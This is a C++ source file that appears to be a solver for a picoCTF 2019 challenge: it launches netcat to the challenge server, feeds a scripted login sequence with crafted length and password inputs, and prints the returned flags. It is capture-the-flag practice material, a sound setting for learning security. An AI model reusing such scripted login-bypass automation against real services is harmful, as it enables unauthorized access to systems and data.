#include <iostream>
#include <cstdio>
#include <algorithm>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <string.h>
using namespace std;
#define endl '\n'
#define pi pair<int, int>

pid_t pid;
int inpipefd[2];
int outpipefd[2];
char buf[256];
int status;

void runcmd(string s = "/bin/nc", string arg0 = "2019shell1.picoctf.com", string arg1 = "21899", string arg2 = ""){
	pid = 0;
	pipe(inpipefd);
	pipe(outpipefd);
	pid = fork();
	if(pid == 0){
		dup2(outpipefd[0], STDIN_FILENO);
		dup2(inpipefd[1], STDOUT_FILENO);
		dup2(inpipefd[1], STDERR_FILENO);
		
		prctl(PR_SET_PDEATHSIG, SIGTERM);
		
		if(arg2 != "") execl(s.c_str(), s.c_str(), arg0.c_str(), arg1.c_str(), arg2.c_str(), (char*)NULL);
		else if(arg1 != "") execl(s.c_str(), s.c_str(), arg0.c_str(), arg1.c_str(), (char*)NULL);
		else if(arg0 != "") execl(s.c_str(), s.c_str(), arg0.c_str(), (char*)NULL);
		else execl(s.c_str(), s.c_str(), (char*)NULL);
		
		exit(1);
	}
	
	close(outpipefd[0]);
	close(inpipefd[1]);
}

void killcmd(){
	kill(pid, SIGKILL);
	waitpid(pid, &status, 0);
}

string cmdin(){
	read(inpipefd[0], buf, 256);
	return string(buf);
}

void cmdout(string s){
	s += '\n';
	write(outpipefd[1], s.c_str(), (int)s.size());
}

string cmdflag(string s, string f = ""){
	string ret;
	while(ret.find(f) == string::npos){
		runcmd();
		for(int i = 0; i < 50 && ret.find(f) == string::npos; i++) ret = cmdin();
		killcmd();
	}
	return ret;
}

int main(){
	ios::sync_with_stdio(false);
	cin.tie(NULL);
	
	string s;
	
	runcmd();
	cmdin();
	cmdout("login");
	cmdin();
	cmdout("26");
	cmdin();
	cmdout("abcdefghijklmnopqrstuvwxyz");
	cmdin();
	cmdout("print-flag");
	s = cmdin();
	cout << s << endl;
	cmdout("logout");
	cmdin();
	cmdout("login");
	cmdin();
	cmdout("3");
	cmdin();
	cmdout("aaa");
	cmdin();
	cmdout("print-flag");
	s = cmdin();
	cout << s << endl;
	cmdout("quit");
	killcmd();

	return 0;
}
